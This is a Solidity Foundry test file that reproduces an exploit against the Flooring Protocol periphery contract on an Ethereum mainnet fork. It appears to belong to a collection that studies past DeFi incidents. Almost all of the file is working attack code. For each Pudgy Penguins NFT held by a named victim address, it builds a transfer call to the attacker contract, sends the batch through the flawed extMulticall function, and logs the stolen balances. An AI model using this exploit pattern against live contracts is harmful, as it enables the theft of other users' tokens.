// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";

import "./IPudgyPenguins.sol";
import "./IFlooringPeriphery.sol";

IPudgyPenguins constant PPG = IPudgyPenguins(
    0xBd3531dA5CF5857e7CfAA92426877b022e612cf8
);
IFlooringPeriphery constant flooringPeriphery = IFlooringPeriphery(
    payable(0x49AD262C49C7aA708Cc2DF262eD53B64A17Dd5EE)
);
address constant victim = 0xe5442aE87E0fEf3F7cc43E507adF786c311a0529;

contract FloorProtocolTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 18802287);
        vm.label(address(PPG), "PPG");
        vm.label(address(flooringPeriphery), "ERC1967Proxy");
        vm.label(victim, "victim");
    }

    function testExploit() public {
        emit log_named_uint(
            "Victim PPG token balance before attack",
            PPG.balanceOf(victim)
        );
        emit log_named_uint(
            "Attacker PPG token balance before attack",
            PPG.balanceOf(address(this))
        );

        IMulticall.CallData[] memory calls = new IMulticall.CallData[](
            PPG.balanceOf(victim)
        );

        for (uint256 i; i < PPG.balanceOf(victim); ++i) {
            uint256 id = PPG.tokenOfOwnerByIndex(victim, i);
            bytes memory data = abi.encodeWithSignature(
                "safeTransferFrom(address,address,uint256)",
                victim,
                address(this),
                id
            );
            IMulticall.CallData memory callData = IMulticall.CallData({
                target: address(PPG),
                callData: data
            });
            calls[i] = callData;
        }
        // Flawed function
        flooringPeriphery.extMulticall(calls);

        emit log_named_uint(
            "Victim PPG token balance after attack",
            PPG.balanceOf(victim)
        );
        emit log_named_uint(
            "Attacker PPG token balance after attack",
            PPG.balanceOf(address(this))
        );
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external pure returns (bytes4) {
        operator;
        from;
        tokenId;
        data;
        return this.onERC721Received.selector;
    }
}
